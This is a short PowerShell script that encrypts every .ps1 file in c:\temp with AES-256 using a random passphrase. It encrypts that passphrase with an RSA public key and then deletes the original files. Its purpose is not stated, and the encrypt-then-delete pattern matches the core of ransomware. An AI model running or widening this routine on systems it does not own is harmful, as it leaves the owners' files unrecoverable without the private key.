$openssl='C:\Program Files (x86)\GnuWin32\bin\openssl.exe'
$DIR='c:\temp'
$PASS=-join ((35..91) + (93..125) | Get-Random -Count 25 | % {[char]$_}) 	#random ascii numbers to chars
echo "$PASS" | C:\Program' Files (x86)\GnuWin32\bin\'openssl.exe rsautl -encrypt -inkey public.pem -pubin -out passphrase.txt

Get-ChildItem "$DIR" -Filter *.ps1 |
Foreach-Object {
	$file=$_.FullName
	."$openssl" enc -aes-256-cbc -in "$file" -out "$file.enc" -pass pass:"$PASS"
	del "$file"
}
